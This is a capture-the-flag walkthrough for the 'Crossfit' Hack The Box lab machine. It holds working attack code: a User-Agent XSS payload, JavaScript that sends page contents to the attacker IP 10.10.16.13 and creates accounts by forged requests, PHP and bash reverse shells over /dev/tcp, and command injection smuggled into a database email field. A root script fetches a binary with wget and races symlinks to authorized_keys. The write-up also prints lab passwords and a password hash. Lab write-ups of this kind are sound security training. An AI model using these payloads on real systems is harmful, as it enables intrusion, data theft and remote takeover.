# Crossfit

## Enumeration

- Nmap scan revealed a domain : info@gym-club.crossfit.htb
- Add domain /etc/hosts

### Gobuster

Runnign gobuster at gym-club.crossfit.htb
```bash
gobuster dir -u http://gym-club.crossfit.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o dir2.txt -x php
```
Output
```
/blog.php (Status: 200)
/contact.php (Status: 200)
/css (Status: 301)
/db.php (Status: 200)
/fonts (Status: 301)
/functions.php (Status: 200)
/gallery.php (Status: 200)
/images (Status: 301)
/img (Status: 301)
/index.php (Status: 200)
/index.php (Status: 200)
/js (Status: 301)
/schedule.php (Status: 200)
/vendor (Status: 301)
```

Interesting ones are 
```
/db.php (blank)
/functions.php (blank)
/vendor (forbidden)
```
Vendor is forbidden but what if any files inside is accessible so I ran gobuster again

```bash
gobuster dir -u http://gym-club.crossfit.htb/vendor -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o dir2.txt -x 
```

And we have
```
/vendor/tilt (which is again forbidden)
```
Lets run gobuster one more time but this time with more extensions

```bash
gobuster dir -u http://gym-club.crossfit.htb/vendor/tilt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o dir2.txt -x php,txt,zip,bak,sql,db
```

I think this is a rabit hole ...

### XSS 
Moving on to blog: http://gym-club.crossfit.htb/blog-single.php
On this page I tried a simple xss on comment box and got a warning

```
XSS attempt detected
A security report containing your IP address and browser information will be generated and our admin team will be immediately notified.
```
I tried many things to bypass the XSS in comments but failed. 
> The xss was in user-agent header.. **but to trigger that you also need to send a xss payload in the message**

After trying few things I got to know(by hint) that there is another subdomain running `ftp.crossfit.htb`

I prepared my payload like this

User-Agent: <script src="my-ip/xss.js"></script>

and to automate this I made simple python script, I dont want to use burp suite to send the request

```python
import requests

url = "http://gym-club.crossfit.htb/blog-single.php"

header = {"User-Agent": "<script src='http://10.10.16.13/xss.js'></script>","Content-type":"application/x-www-form-urlencoded"}
data = {"name":"a","email":"a@b.com","phone":123555,"message":"<script src='http://10.10.16.13/xss.js'></script>","submit":"submit"}
req = requests.post(url,data=data,headers=header)

print(req.status_code)
```

On my machine hosting xss.js with python
```bash
python3 -m http.server 80
```

XSS.js
```javascript
function getResponse(url)
{
    var rawFile = new XMLHttpRequest();
    rawFile.open("GET", url, false);
    rawFile.onreadystatechange = function ()
    {
        if(rawFile.readyState === 4)
        {
            if(rawFile.status === 200)
            {
                var allText = rawFile.responseText;
                var req = new XMLHttpRequest();
                req.open("GET","http://10.10.16.13/?response="+ JSON.stringify(allText),false);
                req.send();
            }
        }
    }
    rawFile.send(null);
}
getResponse("http://ftp.crossfit.htb");
```

This return me a html code in which we can create ftp account

![ftp index.html](/assets/images/crossfit/ftp1.png)

Url of that button is : http://ftp.crossfit.htb/accounts/create
sending again our request to this url with xss.js

We got our response back and we have account adding facility

![ftp index.html](/assets/images/crossfit/ftp2.png)

Now we need to create an account by sending a post request. Thats easy just intercept your localhost request(in which you have saved the html code for /account/create) and write a javascript code for that

createAccount.js
```javascript
myhttpserver = 'http://ip/?q='
targeturl = 'http://ftp.crossfit.htb/accounts/create'
username = 'rider'
password = 'rider'

req = new XMLHttpRequest;
req.withCredentials = true;
req.onreadystatechange = function() {
    if (req.readyState == 4) {
        req2 = new XMLHttpRequest;
        req2.open('GET', myhttpserver + btoa(this.responseText), false);
        req2.send();
    }
}
req.open('GET', targeturl, false);
req.send();

regx = /token" value="(.*)"/g;
token = regx.exec(req.responseText)[1];


var params = '_token=' + token + '&username=' + username + '&pass=' + password + '&submit=submit'
req.open('POST', "http://ftp.crossfit.htb/accounts", false);
req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
req.send(params);
```
And our user created successfully
Now log in using lftp because ftp does not suppurt ssl

![ftp index.html](/assets/images/crossfit/lftp2.png)



## **Foothold**

- And there is another domain development-test, lets check that out
- If we see that directory has read and write permissions means we can put our shell in that and then try to to trigger the shell.
- but we can't trigger it from our side, we have to use XSS again

shell.php
```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.16.13/1234 0>&1'"); ?>
```
put this php file in development-test directory

trigger.js
```js
 var r = new XMLHttpRequest();
    r.open("GET",'http://development-test.crossfit.htb/shell.php',false);
    r.send();
```

Again sending the request with our exploit.py and triggering the shell.
We got foothold


## User

Found some password in gym-club/db.php
```php
cat db.php
<?php
$dbhost = "localhost";
$dbuser = "crossfit";
$dbpass = "oeLoo~y2baeni";
$db = "crossfit";
$conn = new mysqli($dbhost, $dbuser, $dbpass, $db);
?>

```

Running linepeas gave us two important thing
1. cronstab is running a php script
2. hash for Hank

```
/etc/ansible/playbooks/adduser_hank.yml
$6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/

hank: powerpuffgirls
```

Crack the hash and login

## **Root**

for root we first need to escalate to Issac
Remember he is running a php script from cronjob

send_update.php
```php

<?php
/***************************************************
 * Send email updates to users in the mailing list *
 ***************************************************/
require("vendor/autoload.php");
require("includes/functions.php");
require("includes/db.php");
require("includes/config.php");
use mikehaertl\shellcommand\Command;

if($conn)
{
    $fs_iterator = new FilesystemIterator($msg_dir);

    foreach ($fs_iterator as $file_info)
    {
        if($file_info->isFile())
        {
            $full_path = $file_info->getPathname(); 
            $res = $conn->query('SELECT email FROM users');
            while($row = $res->fetch_array(MYSQLI_ASSOC))
            {
                $command = new Command('/usr/bin/mail');
                $command->addArg('-s', 'CrossFit Club Newsletter', $escape=true);
                $command->addArg($row['email'], $escape=true);

                $msg = file_get_contents($full_path);
                $command->setStdIn('test');
                $command->execute();
            }
        }
        unlink($full_path);
    }
}

cleanup();
?>

```
This mikehaertl has a issue in addArg

From here I got hint the $msg_dir is in ftp (I don't how people found that.. it is written in config.php but at this stage we can't access it)

So we need ftp password for admin

found in /etc/pam.d/vsftpd
ftp login
```
user=ftpadm passwd=8W)}gpRJvAmnb
```
logging in ftp
```
set ftp:ssl-force true
connect 10.10.10.208
set ssl:verify-certificate no
login ftpadm
```
There is messages directory , just place a random file there

/usr/bin/mail has an -E arg to execute shell commands
Addins shell to mysql database
```
mysql -u crossfit -p"oeLoo~y2baeni" -D crossfit


insert into users (email) values ("-E $(bash -c 'bash -i >& /dev/tcp/10.10.16.13/1337 0>&1')");
```

We got shell as Issac


## **ROOT**

we can't run ps aux fully so I am going to run pspy64 binary to find out running process

```bash
./pspy64 -f
```

There is a binary running: /usr/bin/dbmsg

Decompiling it with ghidra
In main it generating random number with time seed
In process_data() function it is generating a random file and storing it in /var/local/

![process_data function](/assets/images/crossfit/dbmsg_code.png)


**Details**
- process_data is first generating a random number with rand() and then hashing it into md5
- Then it is creating a file with that name and storing it into /var/local/
- After that it is reading three things from the users table in crossfit database
- **it is reading and writing it into a file in order 1 3 2**
- example if i enter `hello rider boy` then it will write in file `hello boy rider`

**Exploiting**
- So we can generate our ssh key and place it into above order so that when the binary reads it from the database it prints our key in correct format
- We are going to generate that random number from time seed, since epoch time is same for every body our random number will be same.

random.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
	srand(time(0));
	printf("%d\n",rand());
	return 0;
}
```
and now a single script to do all the things

Rooter.sh
```bash
# compiled c program
wget 10.10.16.13/random_gen
# make it executable
chmod +x random_gen
# insert my public key in the db
mysql -h localhost -u crossfit -poeLoo~y2baeni -Dcrossfit -e'insert into messages (id, name, email,message) values (1, "ssh-rsa","darkrider@sunshine","key-here");'
# try to create symlinks with the random number generator in a loop
while true; do ln -s /root/.ssh/authorized_keys /var/local/$(echo -n $(./random_gen)1 | md5sum | cut -d " " -f 1) 2>/dev/null; done

```


Just transfer this script to the machine and run
After some time login as root using your private ssh key!!

Rooted!!
